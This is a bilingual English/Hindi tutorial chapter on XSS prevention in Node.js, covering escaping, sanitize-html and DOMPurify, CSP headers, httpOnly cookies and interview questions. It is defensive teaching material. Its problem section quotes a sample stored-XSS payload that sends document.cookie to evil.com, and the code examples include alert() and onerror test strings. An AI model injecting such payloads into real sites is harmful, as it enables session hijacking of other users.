# 133. XSS Prevention in Node
# हिंदी में: Node में XSS से बचाव

---

## 🔵 Simple Definition (English)
**XSS (Cross-Site Scripting)** is an attack where malicious JavaScript gets injected into a web page (via unsanitized user input) and executes in victims' browsers, stealing cookies, sessions, or performing actions as the victim. **XSS prevention** means escaping/encoding output, validating input, and setting security headers (CSP) so injected scripts never execute.

## 🔵 सरल परिभाषा (Hindi)
**XSS** एक attack है जहाँ malicious JavaScript web page में inject हो जाता है (unsanitized user input के through) और victims के browser में execute होता है, cookies/sessions चुराता है। **XSS prevention** output को escape/encode करना, input validate करना, और CSP headers set करना है ताकि injected scripts कभी execute न हों।

---

## 🔴 Problem it Solves
If a comment system stores and displays user input directly (`<div>${userComment}</div>`) without escaping, an attacker can post a comment like `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. Every other user who views that comment has this script silently execute in THEIR browser, stealing THEIR session cookie and sending it to the attacker — who can now impersonate them. XSS prevention stops raw HTML/JS from being interpreted as executable code when rendering user-supplied content.

## 🔴 यह क्यों बना? (Hindi)
अगर comment system user input को directly escape किए बिना store/display करता है, attacker malicious script वाला comment post कर सकता है। जो भी user उसे देखता है, script उनके browser में silently execute हो जाता है, उनकी session cookie चुरा लेता है। XSS prevention raw HTML/JS को executable code की तरह interpret होने से रोकता है।

---

## 🟢 How it Works — Step by Step

Step 1 → Identify the three XSS types: **Stored** (payload saved in DB, served to all viewers), **Reflected** (payload in URL/query, reflected back in response), **DOM-based** (client-side JS writes unsanitized data into DOM)
Step 2 → At output time, HTML-escape all user-controlled content before inserting into HTML (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`)
Step 3 → Use templating engines that auto-escape by default (EJS `<%= %>`, Handlebars `{{ }}`) — avoid raw/unescaped interpolation (`<%- %>`, `{{{ }}}`)
Step 4 → Set `Content-Security-Policy` header restricting which script sources can execute
Step 5 → Sanitize any HTML you must allow (rich text) using a library like `DOMPurify` or `sanitize-html` — strip `<script>`, `onerror=`, `javascript:` URLs etc.
Step 6 → Set cookies as `httpOnly` so even if XSS executes, JS cannot read the session cookie via `document.cookie`
Step 7 → Validate/sanitize on input too (defense in depth), but never rely on input validation alone — always escape on OUTPUT

## 🟢 कैसे काम करता है? (Hindi)
Step 1 → तीन XSS types पहचानो: Stored, Reflected, DOM-based
Step 2 → Output के समय सभी user content को HTML-escape करो
Step 3 → Auto-escaping templating engines use करो
Step 4 → `Content-Security-Policy` header set करो
Step 5 → ज़रूरी हो तो rich text को `DOMPurify`/`sanitize-html` से sanitize करो
Step 6 → Cookies को `httpOnly` set करो
Step 7 → Input पर भी validate करो, पर output escaping पर मुख्य रूप से depend करो

---

## 🟡 Real World Example
**Flipkart product reviews:** A user writes a review with text `Great product! <script>alert('hacked')</script>`. If Flipkart's frontend directly injects this into the DOM via `innerHTML`, the script executes for every viewer. Flipkart instead: (1) escapes the text when rendering (React does this automatically for `{text}` but NOT for `dangerouslySetInnerHTML`), (2) runs the review through a sanitizer if any formatting (bold/italic) is allowed, (3) sets a strict CSP header blocking inline scripts, (4) marks the session cookie `httpOnly` so even a successful XSS can't steal it via `document.cookie`.

## 🟡 Real Example Hindi mein
**Flipkart product reviews:** User एक review लिखता है जिसमें `<script>` tag है। अगर Flipkart directly `innerHTML` में डाल दे, script हर viewer के लिए execute होगा। इसलिए Flipkart text escape करता है, sanitizer use करता है, CSP header set करता है, और cookie को `httpOnly` रखता है।

---

## 💻 Code Example — Basic

```javascript
// xss-basic.js — manual HTML escaping
// Run with: node xss-basic.js

// ─── 1. HTML ESCAPE FUNCTION ──────────────────────────────────────────────────
function escapeHtml(unsafe) {
  return String(unsafe)
    .replace(/&/g, '&amp;')    // must be first! avoid double-escaping
    .replace(/</g, '&lt;')     // prevents opening tags
    .replace(/>/g, '&gt;')     // prevents closing tags
    .replace(/"/g, '&quot;')   // prevents breaking out of attributes
    .replace(/'/g, '&#x27;');  // prevents breaking out of single-quoted attrs
}

// ─── 2. SIMULATE RENDERING USER INPUT ────────────────────────────────────────
const maliciousComment = `Nice! <script>alert('XSS')</script>`;

const unsafeHtml = `<div>${maliciousComment}</div>`;
console.log('UNSAFE (vulnerable):', unsafeHtml);
// <div>Nice! <script>alert('XSS')</script></div>  ← script would execute!

const safeHtml = `<div>${escapeHtml(maliciousComment)}</div>`;
console.log('SAFE (escaped):', safeHtml);
// <div>Nice! &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</div>
// Browser renders this as literal TEXT, not executable script ✅
```

## 💻 Code Example — Advanced

```javascript
// xss-advanced.js — sanitize-html for allowed rich text + CSP header generation

const sanitizeHtml = require('sanitize-html');  // npm install sanitize-html

// ─── 1. ALLOW LIMITED SAFE HTML (e.g., bold, italic, links in reviews) ───────
function sanitizeUserContent(dirtyHtml) {
  return sanitizeHtml(dirtyHtml, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],   // whitelist only
    allowedAttributes: {
      a: ['href', 'rel'],   // only href/rel allowed on <a>
    },
    allowedSchemes: ['http', 'https', 'mailto'],   // block javascript: URLs
    transformTags: {
      a: (tagName, attribs) => ({
        tagName: 'a',
        attribs: {
          ...attribs,
          rel: 'noopener noreferrer',  // prevent tabnabbing via target=_blank links
          target: '_blank',
        },
      }),
    },
  });
}

const dirty = `<p>Great product!</p><script>alert('hacked')</script><img src=x onerror="alert('xss')">`;
console.log(sanitizeUserContent(dirty));
// <p>Great product!</p>   ← script AND img tags stripped completely

// ─── 2. CSP HEADER BUILDER ─────────────────────────────────────────────────────
function buildCspHeader() {
  const directives = {
    'default-src': ["'self'"],                         // only same-origin by default
    'script-src': ["'self'", 'https://cdn.trusted.com'], // scripts only from these origins
    'style-src': ["'self'", "'unsafe-inline'"],          // allow inline styles (common for CSS-in-JS)
    'img-src': ["'self'", 'https://images.flipkart.com', 'data:'],
    'object-src': ["'none'"],                            // block <object>/<embed> entirely
    'base-uri': ["'self'"],                              // prevent <base> tag hijacking
    'frame-ancestors': ["'none'"],                        // prevent clickjacking (can't be iframed)
  };

  return Object.entries(directives)
    .map(([key, values]) => `${key} ${values.join(' ')}`)
    .join('; ');
}

console.log(buildCspHeader());
// default-src 'self'; script-src 'self' https://cdn.trusted.com; ...

module.exports = { sanitizeUserContent, buildCspHeader };
```

---

## 🟠 Express.js Integration

```javascript
// server.js
const express = require('express');
const helmet = require('helmet');               // npm install helmet
const { sanitizeUserContent } = require('./xss-advanced');

const app = express();
app.use(express.json());

// Helmet sets CSP + other security headers automatically
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", 'https://cdn.trusted.com'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  })
);

// Session cookie: httpOnly prevents JS from reading it even if XSS succeeds
app.use((req, res, next) => {
  res.cookie('session', 'some-session-value', {
    httpOnly: true,   // JS cannot access via document.cookie
    secure: true,      // only sent over HTTPS
    sameSite: 'strict',
  });
  next();
});

// Submitting a review — sanitize before storing AND escaping handled at render time
app.post('/reviews', async (req, res) => {
  const { productId, text } = req.body;

  // Sanitize rich text input before saving to DB (defense in depth)
  const cleanText = sanitizeUserContent(text);

  const review = await Review.create({ productId, text: cleanText });
  res.status(201).json(review);
});

// Rendering with EJS (auto-escapes by default with <%= %>)
app.set('view engine', 'ejs');
app.get('/reviews/:productId', async (req, res) => {
  const reviews = await Review.find({ productId: req.params.productId });
  // In the .ejs template: <%= review.text %>  ← auto-escaped, safe
  // NEVER use <%- review.text %> for untrusted content (raw, unescaped!)
  res.render('reviews', { reviews });
});

app.listen(3000);
```

---

## ⚠️ Common Mistakes to Avoid
❌ Mistake 1: Using `innerHTML` or `dangerouslySetInnerHTML` with unsanitized user data
```javascript
// WRONG (React): renders raw HTML, including any <script> or event handlers
<div dangerouslySetInnerHTML={{ __html: review.text }} />

// CORRECT: sanitize first, or avoid raw HTML rendering entirely
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.text) }} />
// Best: just render as text if no formatting is needed
<div>{review.text}</div>  // React auto-escapes text content
```

❌ Mistake 2: Trusting input validation alone, skipping output escaping
```javascript
// WRONG: validating input doesn't help if a trusted-but-unescaped field is rendered
// e.g., validated "name" field still gets injected into HTML without escaping
const html = `<h1>Welcome ${user.name}</h1>`;  // if name = "<script>...", still XSS!

// CORRECT: ALWAYS escape at the point of rendering, regardless of input validation
const html = `<h1>Welcome ${escapeHtml(user.name)}</h1>`;
```

---

## 🧠 Tricky Interview Question

```javascript
// Using EJS template:
// <%= userInput %>   vs   <%- userInput %>
// userInput = '<b>bold</b>'
// What does each render as, visually, in the browser?
```
Answer: `<%= userInput %>` (escaped output) renders the literal text `<b>bold</b>` on the page — the user SEES the angle brackets as text, not actual bold formatting, because EJS HTML-escapes it. `<%- userInput %>` (raw/unescaped output) inserts the HTML as-is, so the browser actually renders **bold** text. The trap: `<%- %>` is dangerous for ANY user-supplied content (opens XSS), but necessary for trusted, pre-sanitized HTML (e.g., content you sanitized server-side with `sanitize-html`, or your own static markup). The single-character difference (`=` vs `-`) is a classic interview gotcha.

---

## ⚫ Interview Questions + Answers

Q1: What are the three types of XSS, and how do they differ?
A1: **Stored XSS**: malicious script saved in the database (e.g., a comment), served to every user who views that content — most dangerous, widest impact. **Reflected XSS**: payload comes from the request itself (URL query param, form input) and is immediately reflected back in the response without being stored — requires tricking a victim into clicking a crafted link. **DOM-based XSS**: the vulnerability exists entirely in client-side JavaScript that writes untrusted data into the DOM (e.g., `document.write(location.hash)`) without ever touching the server.

Q2: Why is `httpOnly` on cookies important for XSS mitigation, even though it doesn't prevent XSS itself?
A2: `httpOnly` doesn't stop the XSS injection from happening — it limits the DAMAGE. Even if an attacker successfully injects a script, `document.cookie` cannot read `httpOnly` cookies, so the attacker can't steal the session token that way. It's defense-in-depth: XSS might still perform other damage (defacement, fake forms, keylogging), but session hijacking via cookie theft specifically is blocked.

Q3: What is Content-Security-Policy (CSP) and how does it help against XSS?
A3: CSP is a response header that tells the browser which sources of scripts, styles, images, etc. are allowed to load/execute. A strict policy like `script-src 'self'` means even if an attacker injects `<script>alert(1)</script>` into the page, the browser refuses to execute inline scripts (unless `'unsafe-inline'` is explicitly allowed, which you should avoid). This acts as a powerful backstop even when an XSS injection succeeds — the payload still won't run.

Q4: Does React/Vue/Angular automatically prevent XSS?
A4: Mostly, for standard text rendering: React's `{variable}` JSX interpolation, Vue's `{{ }}`, and Angular's `{{ }}` all auto-escape by default, converting `<script>` into literal text. However, they do NOT protect you when you explicitly bypass escaping: React's `dangerouslySetInnerHTML`, Vue's `v-html`, Angular's `[innerHTML]` (though Angular sanitizes some of this automatically via its `DomSanitizer`). Also unsafe: directly manipulating `href`/`src` attributes with `javascript:` URLs, or building URLs from user input without validation.

Q5: How would you sanitize user-submitted HTML that needs to allow some formatting (like a rich-text editor)?
A5: Use a dedicated sanitization library server-side (and ideally also client-side before display) like `sanitize-html` or `DOMPurify` with an explicit **whitelist** of allowed tags/attributes (e.g., `b`, `i`, `a` with only `href`), never a blacklist (blacklists always miss new attack vectors). Explicitly block dangerous attributes (`onerror`, `onclick`, any `on*` handler) and dangerous URL schemes (`javascript:`, `data:text/html`). Sanitize on save (to normalize stored data) AND consider re-sanitizing on render as defense-in-depth.

---

## 🔷 When to Use + When Not to Use
✅ Use when:
- Any part of your app renders user-supplied content — comments, reviews, usernames, bios, chat messages.
- Building any public-facing web app that accepts and displays user input.

❌ Avoid when:
- N/A — XSS prevention should ALWAYS be applied wherever untrusted content is rendered; there's no valid case to skip it for user-facing output.

---

## 📊 Visual Diagram

```
XSS ATTACK WITHOUT PROTECTION:
──────────────────────────────────────────────────────────

  Attacker posts comment: <script>stealCookie()</script>
       │
       ▼
  Stored in DB as-is (no sanitization)
       │
       ▼
  Server renders: <div>${comment}</div>   (no escaping)
       │
       ▼
  Victim's browser receives HTML, PARSES <script> tag
       │
       ▼
  Script EXECUTES in victim's browser context
       │
       ▼
  document.cookie sent to attacker's server ❌ SESSION STOLEN

WITH PROTECTION (escaping + httpOnly + CSP):
  Comment escaped → rendered as literal text (no script tag parsed)
  Even if script somehow got through → CSP blocks execution
  Even if script executed → httpOnly cookie can't be read via JS
  → Defense in depth stops the attack at multiple layers ✅
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| XSS | Script injection executing in victim's browser | Victim के browser में script injection |
| Stored XSS | Payload saved in DB, served to all viewers | DB में saved payload, सभी viewers को |
| Reflected XSS | Payload reflected from request immediately | Request से immediately reflect होने वाला payload |
| CSP | Header restricting allowed script/resource sources | Allowed sources restrict करने वाला header |
| Sanitization | Removing/neutralizing dangerous HTML/JS | Dangerous HTML/JS हटाना |
| httpOnly cookie | Cookie not readable by JavaScript | JS से न पढ़ी जा सकने वाली cookie |

---

## ⚡ 3-Line Summary
English:
1. XSS injects malicious scripts into pages via unsanitized user input, executing in victims' browsers to steal sessions or data.
2. Always HTML-escape user content at output time, use whitelisted sanitizers for any allowed rich text, and never use raw/unescaped template interpolation on untrusted data.
3. Layer defenses: CSP headers, `httpOnly` cookies, and auto-escaping frameworks — never rely on a single protection.

Hindi:
1. XSS unsanitized user input से malicious scripts inject करता है, victims के browser में execute होकर sessions/data चुराता है।
2. User content को output time पर HTML-escape करो, rich text के लिए whitelisted sanitizer use करो, untrusted data पर raw interpolation कभी मत करो।
3. CSP headers, `httpOnly` cookies, auto-escaping frameworks — multiple layers से defend करो।

---

## ➡️ Next Topic
**134. SQL Injection Prevention** — Parameterized queries और ORM से database attacks रोकना।
